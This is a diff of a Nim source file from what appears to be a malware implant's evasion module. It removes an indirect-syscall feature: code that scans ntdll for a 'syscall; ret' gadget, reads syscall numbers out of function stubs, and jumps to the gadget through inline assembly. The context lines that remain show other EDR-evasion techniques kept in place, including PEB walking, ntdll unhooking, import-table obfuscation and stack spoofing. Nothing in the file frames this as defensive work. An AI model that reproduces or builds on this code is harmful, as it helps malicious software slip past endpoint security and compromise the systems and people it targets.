@@ -61,7 +61,7 @@ proc djb2HashStrLower*(s: string): uint32 =
 
 # ---- PEB Walking ----
 
-when defined(evasion_dfr) or defined(evasion_unhook_ntdll) or defined(evasion_iat_obf) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+when defined(evasion_dfr) or defined(evasion_unhook_ntdll) or defined(evasion_iat_obf) or defined(evasion_stack_spoof):
   proc getPeb(): pointer =
     ## Get the PEB via inline assembly
     when defined(amd64):
@@ -114,7 +114,7 @@ when defined(evasion_dfr) or defined(evasion_unhook_ntdll) or defined(evasion_ia
 
     return nil
 
-when defined(evasion_dfr) or defined(evasion_indirect_syscalls):
+when defined(evasion_dfr):
   proc getExportByHash*(moduleBase: pointer, functionHash: uint32): pointer =
     ## Parse PE export table and find an export by DJB2 hash
     if moduleBase == nil:
@@ -278,83 +278,6 @@ when defined(evasion_iat_obf):
 
     var temp: DWORD
     discard VirtualProtect(importDir, importDirSize.int.SIZE_T, oldProtect, addr temp)
-
-# ---- Indirect Syscalls ----
-
-when defined(evasion_indirect_syscalls):
-  var syscallGadget*: pointer = nil
-
-  proc findSyscallGadget*(): pointer =
-    ## Scan ntdll .text section for a `syscall; ret` (0x0F 0x05 0xC3) gadget.
-    ## Returns the address, which is used to jmp to instead of executing syscall inline.
-    let ntdllHash = djb2HashStrLower("ntdll.dll")
-    let ntdllBase = getModuleByHash(ntdllHash)
-    if ntdllBase == nil:
-      return nil
-
-    let dosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
-    let ntHeaders = cast[PIMAGE_NT_HEADERS](cast[int](ntdllBase) + dosHeader.e_lfanew)
-    let numSections = ntHeaders.FileHeader.NumberOfSections
-    let firstSection = IMAGE_FIRST_SECTION(ntHeaders)
-
-    for i in 0 ..< numSections.int:
-      let section = cast[PIMAGE_SECTION_HEADER](cast[int](firstSection) + i * IMAGE_SIZEOF_SECTION_HEADER)
-      let nameArr = section.Name
-
-      if nameArr[0] == byte('.') and nameArr[1] == byte('t') and nameArr[2] == byte('e') and
-         nameArr[3] == byte('x') and nameArr[4] == byte('t'):
-        let textStart = cast[ptr UncheckedArray[byte]](cast[int](ntdllBase) + section.VirtualAddress.int)
-        let textSize = section.Misc.VirtualSize.int
-
-        for j in 0 ..< (textSize - 2):
-          if textStart[j] == 0x0F'u8 and textStart[j + 1] == 0x05'u8 and textStart[j + 2] == 0xC3'u8:
-            return cast[pointer](cast[int](textStart) + j)
-        break
-
-    return nil
-
-  proc getSsn*(functionHash: uint32): int32 =
-    ## Extract the syscall number (SSN) from an Nt* function stub in ntdll.
-    ## Typical stub: mov r10, rcx (4C 8B D1); mov eax, <SSN> (B8 xx xx 00 00)
-    let ntdllHash = djb2HashStrLower("ntdll.dll")
-    let ntdllBase = getModuleByHash(ntdllHash)
-    if ntdllBase == nil:
-      return -1
-
-    let funcAddr = getExportByHash(ntdllBase, functionHash)
-    if funcAddr == nil:
-      return -1
-
-    let fb = cast[ptr UncheckedArray[byte]](funcAddr)
-    # Look for B8 at offset 3 or 4 (depending on stub variant)
-    if fb[3] == 0xB8'u8:
-      return cast[ptr int32](cast[int](funcAddr) + 4)[]
-    elif fb[4] == 0xB8'u8:
-      return cast[ptr int32](cast[int](funcAddr) + 5)[]
-    return -1
-
-  proc initIndirectSyscalls*() =
-    ## Cache the syscall gadget address for later use.
-    syscallGadget = findSyscallGadget()
-
-  when defined(amd64):
-    proc indirectSyscall*(ssn: uint32, gadget: pointer, arg1, arg2, arg3, arg4: uint): int32 =
-      ## Execute a syscall indirectly by jumping to a syscall;ret gadget in ntdll.
-      {.emit: """
-        int status;
-        __asm__ volatile(
-          "mov r10, rcx\n\t"
-          "mov eax, %[ssn]\n\t"
-          "jmp *%[gadget]\n\t"
-          : "=a"(status)
-          : [ssn] "r"((unsigned int)`ssn`),
-            [gadget] "r"(`gadget`),
-            "c"(`arg1`), "d"(`arg2`),
-            "D"(`arg3`), "S"(`arg4`)
-          : "r10", "r8", "r9", "memory"
-        );
-        `result` = status;
-      """.}
 
 # ---- Stack Spoofing ----
 
@@ -568,9 +491,6 @@ proc runEvasionInit*() =
   ## Run all enabled evasion techniques. Call as early as possible.
   when defined(evasion_unhook_ntdll):
     unhookNtdll()
-
-  when defined(evasion_indirect_syscalls):
-    initIndirectSyscalls()
 
   when defined(evasion_stack_spoof):
     initStackSpoof()
